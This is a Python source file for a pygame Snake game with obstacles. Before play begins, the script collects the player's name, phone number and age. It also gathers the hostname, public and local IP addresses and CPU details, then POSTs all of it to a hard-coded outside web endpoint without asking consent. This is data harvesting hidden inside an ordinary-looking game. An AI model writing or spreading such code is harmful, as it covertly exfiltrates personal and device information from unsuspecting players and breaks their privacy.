import pygame
import random
import os
import re
import requests
import socket
import platform
import psutil  # New import for CPU data

# Initialize pygame
pygame.init()

# Screen dimensions
WIDTH, HEIGHT = 600, 400

# Colors
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
BLACK = (0, 0, 0)
BLUE = (0, 0, 255)

# Snake settings
snake_size = 20
snake = [(100, 100), (80, 100), (60, 100)]  # Initial snake body parts
snake_dir = (1, 0)  # Moving to the right

# Food settings
food_pos = (random.randint(0, (WIDTH - snake_size) // snake_size) * snake_size,
            random.randint(0, (HEIGHT - snake_size) // snake_size) * snake_size)

# Obstacle settings
obstacles = []  # List to store obstacles

# Clock to control frame rate
clock = pygame.time.Clock()

# Game Over flag
game_over = False

# Score
score = 0

# Font
font = pygame.font.SysFont("comicsans", 35)

# File to store player details
player_info_file = 'player_info.txt'


def draw_snake(snake):
    for pos in snake:
        pygame.draw.rect(screen, GREEN, pygame.Rect(pos[0], pos[1], snake_size, snake_size))


def draw_food(food_pos):
    pygame.draw.rect(screen, RED, pygame.Rect(food_pos[0], food_pos[1], snake_size, snake_size))


def draw_obstacles(obstacles):
    for obstacle in obstacles:
        pygame.draw.rect(screen, BLUE, pygame.Rect(obstacle[0], obstacle[1], snake_size, snake_size))


def display_score(score):
    score_text = font.render(f"Score: {score}", True, WHITE)
    screen.blit(score_text, [0, 0])


def is_collision(pos1, pos2):
    return pos1[0] == pos2[0] and pos1[1] == pos2[1]


# Validate phone number
def validate_phone_number(phone_number):
    pattern = r'^[6-9]\d{9}$'
    return re.match(pattern, phone_number) is not None


# Function to collect player information
def get_player_info():
    player_name = input("Enter your name: ")

    while True:
        phone_number = input("Enter your phone number (10 digits, starting with 6/7/8/9): ")
        if validate_phone_number(phone_number):
            break
        else:
            print("Invalid phone number! Please enter a valid phone number.")

    age = input("Enter your age: ")

    # Validate age input
    if not age.isdigit() or int(age) < 0 or int(age) > 120:
        print("Invalid age! Please enter a valid age.")
        return get_player_info()

    # Check if all fields are filled
    if player_name and phone_number and age:
        # Save player details to a text file
        with open(player_info_file, 'w') as f:
            f.write(f"{player_name}\n{phone_number}\n{age}\n")
        print(f"Thank you, {player_name}. The game will now start!")
    else:
        print("All details are required! Please fill in all the fields.")
        return get_player_info()


# Function to load player information from a text file
def load_player_info():
    if os.path.exists(player_info_file):
        with open(player_info_file, 'r') as f:
            details = f.readlines()
            if len(details) >= 3:
                player_name = details[0].strip()
                phone_number = details[1].strip()
                age = details[2].strip()

                print(f"Welcome back, {player_name}!")
                return player_name, phone_number, age
    return None, None, None


# Function to get system information
def get_system_info():
    system_info = {
        "Hostname": socket.gethostname(),
        "OS Name": platform.system(),
        "OS Version": platform.version(),
        "Public IP Address": get_public_ip(),
        "Local IP Address": get_local_ip(),
    }
    return system_info


def get_public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        response.raise_for_status()  # Raise an error for bad responses
        return response.json()['ip']
    except requests.RequestException:
        return "Unable to retrieve IP"


def get_local_ip():
    return socket.gethostbyname(socket.gethostname())


# Function to get CPU information
def get_cpu_info():
    cpu_info = {
        "CPU": platform.processor(),
        "CPU Count": psutil.cpu_count(logical=True),
        "CPU Frequency": psutil.cpu_freq().current,
        "CPU Usage": psutil.cpu_percent(interval=1),
    }
    return cpu_info


# Function to send user data as a POST request
def send_user_data(player_name, phone_number, age):
    system_info = get_system_info()
    cpu_info = get_cpu_info()
    
    user_data = {
        "name": player_name,
        "phone": phone_number,
        "age": age,
        "public_ip": system_info["Public IP Address"],
        "local_ip": system_info["Local IP Address"],
        "hostname": system_info["Hostname"],
        "cpu_name": cpu_info["CPU"],
        "cpu_count": cpu_info["CPU Count"],
        "cpu_frequency": cpu_info["CPU Frequency"],
        "cpu_usage": cpu_info["CPU Usage"],
    }

    # Replace 'YOUR_API_ENDPOINT' with your actual endpoint URL
    api_url = "https://gagandevraj.com/dbcall/Games/snake_game.php"  # Example: "http://example.com/api/userdata"
    
    try:
        response = requests.post(api_url, data=user_data)  # Corrected this line
        if response.status_code == 200:
            print("User data Recorded Successfully!")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"An error occurred while sending data: {e}")


# Try to load player information; if not found, get new info
player_name, phone_number, age = load_player_info()
if player_name is None:
    player_name, phone_number, age = get_player_info()

# Send user data after collecting all info
send_user_data(player_name, phone_number, age)

# Display system information
system_info = get_system_info()
print("\nSystem Information:")
for key, value in system_info.items():
    print(f"{key}: {value}")

# Display CPU information
cpu_info = get_cpu_info()
print("\nCPU Information:")
for key, value in cpu_info.items():
    print(f"{key}: {value}")

# Initialize the game window
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Snake Game with Obstacles")

# Game loop
while not game_over:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            game_over = True

    # Snake movement logic
    keys = pygame.key.get_pressed()
    if keys[pygame.K_UP] and snake_dir != (0, 1):
        snake_dir = (0, -1)
    if keys[pygame.K_DOWN] and snake_dir != (0, -1):
        snake_dir = (0, 1)
    if keys[pygame.K_LEFT] and snake_dir != (1, 0):
        snake_dir = (-1, 0)
    if keys[pygame.K_RIGHT] and snake_dir != (-1, 0):
        snake_dir = (1, 0)

    # Update snake position
    new_head = (snake[0][0] + snake_dir[0] * snake_size, snake[0][1] + snake_dir[1] * snake_size)
    snake = [new_head] + snake[:-1]

    # Check if snake eats the food
    if is_collision(snake[0], food_pos):
        score += 1
        snake.append(snake[-1])  # Extend the snake
        food_pos = (random.randint(0, (WIDTH - snake_size) // snake_size) * snake_size,
                    random.randint(0, (HEIGHT - snake_size) // snake_size) * snake_size)

        # Add a new obstacle after each food is eaten
        obstacle_pos = (random.randint(0, (WIDTH - snake_size) // snake_size) * snake_size,
                        random.randint(0, (HEIGHT - snake_size) // snake_size) * snake_size)
        obstacles.append(obstacle_pos)

    # Check if the snake hits itself
    if new_head in snake[1:]:
        game_over = True

    # Check if the snake hits the border
    if not (0 <= new_head[0] < WIDTH and 0 <= new_head[1] < HEIGHT):
        game_over = True

    # Check if the snake hits an obstacle
    for obstacle in obstacles:
        if is_collision(new_head, obstacle):
            game_over = True

    # Fill the screen with black background
    screen.fill(BLACK)

    # Draw snake, food, and obstacles
    draw_snake(snake)
    draw_food(food_pos)
    draw_obstacles(obstacles)

    # Display score
    display_score(score)

    # Update display
    pygame.display.update()

    # Set the speed of the game based on difficulty
    clock.tick(10)

# Exit the game
pygame.quit()
